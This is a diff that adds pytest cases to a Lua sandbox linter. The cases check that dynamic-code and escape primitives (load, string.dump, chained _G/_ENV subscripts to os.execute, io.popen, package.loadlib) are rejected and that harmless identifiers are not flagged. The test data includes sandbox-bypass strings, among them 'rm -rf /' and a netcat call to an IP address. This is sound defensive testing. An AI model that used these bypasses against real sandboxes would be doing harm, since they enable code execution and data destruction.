@@ -148,3 +148,98 @@ class TestFinding3RequireBypass:
         src = f"function processEvent(e) local _ = {safe_require}; return e end"
         result = lint_script(src, context="lv3")
         assert not result.has_hard_reject, f"Finding #3 false positive: blocked safe require: {safe_require!r}"
+
+
+class TestW4LoadPrimitive:
+    """W4: Lua 5.4 `load(...)` is the dynamic-code primitive that succeeds the
+    deprecated `loadstring(...)`. It must be hard-rejected just like its
+    predecessor."""
+
+    @pytest.mark.parametrize("bad_variant", [
+        'load("os.execute(\'id\')")()',
+        'load([==[ os.execute(\'id\') ]==])()',
+        'load("return 1+1")',
+        'load (chunk)',
+        'local f = load("print(1)")',
+    ])
+    def test_load_call_rejected(self, bad_variant):
+        src = f"function processEvent(e) {bad_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert result.has_hard_reject, f"W4: lint passed load() variant: {bad_variant!r}"
+
+    @pytest.mark.parametrize("safe_variant", [
+        "local function load_config(path) return path end",
+        "local load_count = 0",
+        "event.load_avg = 1.5",
+        "out['load_pct'] = 99",
+        "local loadable = true",
+    ])
+    def test_load_identifier_not_rejected(self, safe_variant):
+        """W4: bare `load_*` identifiers / locals are not the primitive — only
+        the call form `load(` is dangerous. Without this carve-out the regex
+        would false-positive on any function/variable starting with `load`."""
+        src = f"function processEvent(e) {safe_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert not result.has_hard_reject, f"W4 false positive: blocked safe load_* identifier: {safe_variant!r}"
+
+
+class TestW4StringDumpPrimitive:
+    """W4: `string.dump` (and the subscript variant) leaks bytecode and is half
+    of the load+dump round-trip sandbox bypass."""
+
+    @pytest.mark.parametrize("bad_variant", [
+        "string.dump(some_func)",
+        "string . dump(fn)",
+        'string["dump"](some_func)',
+        "string['dump'](fn)",
+        'local b = string.dump(fn)',
+        'local b = string["dump"](fn)',
+    ])
+    def test_string_dump_rejected(self, bad_variant):
+        src = f"function processEvent(e) {bad_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert result.has_hard_reject, f"W4: lint passed string.dump variant: {bad_variant!r}"
+
+    @pytest.mark.parametrize("safe_variant", [
+        'local s = string.format("%d", 1)',
+        'local up = string.upper(name)',
+        'event.dump_count = 0',          # `dump` as a field name on a different table
+        'local user_dump = data',        # identifier containing "dump"
+    ])
+    def test_other_string_methods_allowed(self, safe_variant):
+        src = f"function processEvent(e) {safe_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert not result.has_hard_reject, f"W4 false positive: blocked safe string usage: {safe_variant!r}"
+
+
+class TestW4ChainedSubscriptBypass:
+    """W4: `_G["os"]["execute"]` / `_ENV["io"]["popen"]` — chained-subscript
+    bypass that sidesteps both `os.execute` and `os["execute"]`."""
+
+    @pytest.mark.parametrize("bad_variant", [
+        '_G["os"]["execute"]("rm -rf /")',
+        "_G['os']['execute']('id')",
+        '_ENV["os"]["execute"]("id")',
+        'tbl["os"]["execute"]("id")',                # arbitrary leading table also bad
+        '_G [ "os" ] [ "execute" ]("id")',           # whitespace
+        '_G["io"]["popen"]("ls")',
+        '_G["package"]["loadlib"]("/lib/evil.so", "evil")',
+        '_G["debug"]["sethook"](fn, "c")',
+        '_ENV["io"]["popen"]("nc 1.2.3.4 443")',
+    ])
+    def test_chained_subscript_rejected(self, bad_variant):
+        src = f"function processEvent(e) {bad_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert result.has_hard_reject, f"W4: lint passed chained-subscript bypass: {bad_variant!r}"
+
+    @pytest.mark.parametrize("safe_variant", [
+        'out.user.name = "alice"',
+        'event["data"]["user"] = nil',
+        'local v = event["log"]["host"]',
+        'event["src"]["ip"] = "1.2.3.4"',
+        'out["meta"]["execute_time"] = 0',           # `execute` only as identifier text, not paired with os/io/etc.
+    ])
+    def test_innocuous_chained_indexing_allowed(self, safe_variant):
+        src = f"function processEvent(e) {safe_variant}; return e end"
+        result = lint_script(src, context="lv3")
+        assert not result.has_hard_reject, f"W4 false positive: blocked innocuous chained index: {safe_variant!r}"
